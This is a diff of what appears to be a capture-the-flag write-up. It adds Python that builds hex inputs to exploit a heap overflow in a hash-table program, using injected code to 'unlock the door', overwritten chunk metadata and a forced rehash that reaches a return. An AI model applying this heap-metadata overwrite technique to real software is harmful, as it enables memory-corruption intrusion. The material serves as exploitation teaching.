@@ -328,19 +328,34 @@ We will now summarize the change made to the metadata of _entry 1_:
 * `fc50`, 0x50fc (next of chunk of _entry 1_) replace by 0x533c - `3c53`
 * `b500`, 0xb5 (size of chunk of _entry 1_) replace by 0x0bff - `ff0b`
 
-
-
+And now we will build our input with python:
 
 ```python
-#last!
-def h(string):
-    index = 0
-    for l in string:
-        index += ord(l)
-        index *= 31
-    return index & 7
+# injection code for unlock the door to entry-0
+input_1 = b'new \x0f\xef\x7f\x40\x7f\x11\x0f\x12\xb0\x12\xec\x4c 0;'.hex()
 
-input1 = (b'new ' + b'\x0f\xef\x7f\x40\x7f\x11\x0f\x12\xb0\x12\xec\x4c' + b' 0;').hex() # קוד שפותח את הדלת ללא הבית 0 וללא הבית רווח. ראו תמונה
+# fill entry-0
+input_2 = b'new bb 0;new cc 0;new dd 0;new ee 0;'.hex()
+
+# overwrite the metadata
+prev_of_entry1 = b'\xf2\x43'
+next_of_entry1 = b'\x3c\x53'
+size_of_entry1 = b'\xff\x0b'
+input_3 = (b'new ' + prev_of_entry1 + next_of_entry1 + size_of_entry1 + b'\x44' + b' 0;').hex()
+# '\x44' only because it will cause the whole string to go into index 0
+
+#Add up to 12 inputs to make rehash work (without overwrite again!)
+input_4 = b'new a 0;new b 0;new c 0;new d 0;new e 0;new f 0;'.hex()
+
+# Invalid command to reach "ret"
+input_5 = b'\x01'.hex()
+
+
+print("Pleasant hack:")
+print(input_1 + input_2 + input_3 + input_4 + input_5)
+
+```
+```python
 input2 = (b'new ' + b'\x22'*2 + b' 0;').hex()
 input3 = (b'new ' + b'\x33'*2 + b' 0;').hex()
 input4 = (b'new ' + b'\x44'*2 + b' 0;').hex()
